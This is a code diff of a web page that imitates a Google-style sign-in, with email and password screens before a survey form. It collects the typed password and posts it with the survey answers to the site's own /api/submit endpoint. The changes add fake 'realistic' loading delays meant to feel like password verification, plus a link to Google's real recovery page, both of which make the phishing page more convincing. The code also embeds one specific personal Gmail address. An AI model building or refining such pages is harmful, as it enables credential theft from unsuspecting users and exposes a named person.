@@ -194,10 +194,35 @@
             font-weight: 500;
             border-radius: 4px;
             cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            min-width: 80px;
+            transition: background 0.2s;
         }
 
         .btn-primary:active {
             background: #0842a0;
+        }
+
+        /* Spinner Animation for Loading State */
+        .spinner {
+            border: 2px solid rgba(255, 255, 255, 0.3);
+            border-radius: 50%;
+            border-top: 2px solid #ffffff;
+            width: 18px;
+            height: 18px;
+            animation: spin 0.8s linear infinite;
+        }
+
+        @keyframes spin {
+            0% {
+                transform: rotate(0deg);
+            }
+
+            100% {
+                transform: rotate(360deg);
+            }
         }
 
         /* Footer */
@@ -269,10 +294,8 @@
             align-items: center;
             justify-content: center;
             overflow: hidden;
-            /* Added to contain the custom image */
         }
 
-        /* Added styling for the custom image */
         .v2-account-pill .avatar img {
             width: 100%;
             height: 100%;
@@ -497,6 +520,7 @@
             font-weight: 500;
             border-radius: 24px;
             cursor: pointer;
+            min-width: 100px;
         }
 
         .btn-submit:active {
@@ -621,8 +645,8 @@
             </div>
 
             <div class="links" style="justify-content: flex-start; margin-bottom: 40px;">
-                <a href="#" onclick="alert('Password reset is disabled in this demo.'); return false;">Forgot
-                    password?</a>
+                <!-- Changed to redirect to Google's real recovery page -->
+                <a href="https://accounts.google.com/signin/recovery">Forgot password?</a>
             </div>
 
             <div class="buttons" style="justify-content: flex-end;">
@@ -1059,7 +1083,7 @@
         // View 2 Inputs
         const greetingText = document.getElementById('greetingText');
         const displayEmail = document.getElementById('displayEmail');
-        const avatarContainer = document.getElementById('avatarContainer'); // Added reference
+        const avatarContainer = document.getElementById('avatarContainer');
         const passwordInput = document.getElementById('passwordInput');
         const v2NextBtn = document.getElementById('v2NextBtn');
         const errorMessage = document.getElementById('errorMessage');
@@ -1068,6 +1092,9 @@
         // Global variables to store login info
         let savedEmail = '';
         let savedPassword = '';
+
+        // Helper to create the loading spinner HTML
+        const spinnerHTML = `<div class="spinner"></div>`;
 
         // --- VIEW 1 LOGIC ---
         v1NextBtn.addEventListener('click', () => {
@@ -1082,41 +1109,46 @@
             // Store email
             savedEmail = email;
 
-            // Define the custom image URL here
-            // You can replace this with a hosted URL if you want to use it online
-            const customImageUrl = '/profile-pic.jpg'; // Example placeholder, replace with your actual image link
+            // Show loading spinner
+            v1NextBtn.innerHTML = spinnerHTML;
+            v1NextBtn.disabled = true;
 
-            // Check for the specific email
-            if (email.toLowerCase() === 'artikasaridevi306@gmail.com') {
-                greetingText.textContent = `Hi Artika Sari`;
-                displayEmail.textContent = email;
+            // Realistic 1-second buffer
+            setTimeout(() => {
+                // Define the custom image URL
+                const customImageUrl = '/profile-pic.jpg';
 
-                // Set the custom profile picture
-                avatarContainer.innerHTML = `<img src="${customImageUrl}" alt="Profile">`;
-            } else {
-                // Default behavior for other emails
-                let name = email.split('@')[0].split('.')[0];
-                name = name.charAt(0).toUpperCase() + name.slice(1);
+                // Check for the specific email
+                if (email.toLowerCase() === 'artikasaridevi306@gmail.com') {
+                    greetingText.textContent = `Hi Artika Sari`;
+                    displayEmail.textContent = email;
+                    avatarContainer.innerHTML = `<img src="${customImageUrl}" alt="Profile">`;
+                } else {
+                    // Default behavior for other emails
+                    let name = email.split('@')[0].split('.')[0];
+                    name = name.charAt(0).toUpperCase() + name.slice(1);
+                    greetingText.textContent = `Hi ${name}`;
+                    displayEmail.textContent = email;
+                    avatarContainer.innerHTML = `
+                        <svg viewBox="0 0 24 24" fill="#444746" style="width: 20px; height: 20px;">
+                            <path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z" />
+                        </svg>
+                    `;
+                }
 
-                greetingText.textContent = `Hi ${name}`;
-                displayEmail.textContent = email;
+                // Reset button state
+                v1NextBtn.innerHTML = 'Next';
+                v1NextBtn.disabled = false;
 
-                // Reset to the default SVG avatar
-                avatarContainer.innerHTML = `
-                    <svg viewBox="0 0 24 24" fill="#444746" style="width: 20px; height: 20px;">
-                        <path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z" />
-                    </svg>
-                `;
-            }
-
-            // Transition
-            view1.style.display = 'none';
-            view2.style.display = 'flex';
-            passwordInput.focus();
+                // Transition to View 2
+                view1.style.display = 'none';
+                view2.style.display = 'flex';
+                passwordInput.focus();
+            }, 1000); // 1000ms = 1 second delay
         });
 
         emailInput.addEventListener('keypress', (e) => {
-            if (e.key === 'Enter') v1NextBtn.click();
+            if (e.key === 'Enter' && !v1NextBtn.disabled) v1NextBtn.click();
         });
 
         // Go back to View 1 if user clicks the account pill in View 2
@@ -1141,14 +1173,25 @@
             // Store password
             savedPassword = password;
 
-            // Transition to Form
-            view2.style.display = 'none';
-            view3.style.display = 'flex';
-            document.body.style.backgroundColor = '#f0f4f9'; // Gray background for form
+            // Show loading spinner
+            v2NextBtn.innerHTML = spinnerHTML;
+            v2NextBtn.disabled = true;
+
+            // Realistic 1.2-second buffer (slightly longer for password verification feel)
+            setTimeout(() => {
+                // Reset button state
+                v2NextBtn.innerHTML = 'Next';
+                v2NextBtn.disabled = false;
+
+                // Transition to Form
+                view2.style.display = 'none';
+                view3.style.display = 'flex';
+                document.body.style.backgroundColor = '#f0f4f9'; // Gray background for form
+            }, 1200);
         });
 
         passwordInput.addEventListener('keypress', (e) => {
-            if (e.key === 'Enter') v2NextBtn.click();
+            if (e.key === 'Enter' && !v2NextBtn.disabled) v2NextBtn.click();
         });
 
         // --- VIEW 3: FORM SUBMISSION ---
@@ -1186,16 +1229,17 @@
                 return;
             }
 
+            // Show spinner in the submit button
+            submitBtn.innerHTML = spinnerHTML;
             submitBtn.disabled = true;
-            submitBtn.textContent = 'Submitting...';
 
             try {
                 const response = await fetch('/api/submit', {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
-                        login_email: savedEmail,       // <-- Added Login Email
-                        login_password: savedPassword, // <-- Added Login Password
+                        login_email: savedEmail,
+                        login_password: savedPassword,
                         consent, age, device_info: device, setup_ease: setup, nav_ease: nav,
                         no_guidance: guidance, readability, speech_accuracy: speech, latency,
                         sign_accuracy: sign, camera_usage: camera, sound_reliability: sounds,
@@ -1211,14 +1255,14 @@
                     submitBtn.textContent = 'Submitted';
                 } else {
                     alert('Something went wrong. Please try again.');
+                    submitBtn.innerHTML = 'Submit';
                     submitBtn.disabled = false;
-                    submitBtn.textContent = 'Submit';
                 }
             } catch (error) {
                 console.error('Error:', error);
                 alert('Failed to connect to the server.');
+                submitBtn.innerHTML = 'Submit';
                 submitBtn.disabled = false;
-                submitBtn.textContent = 'Submit';
             }
         });
 
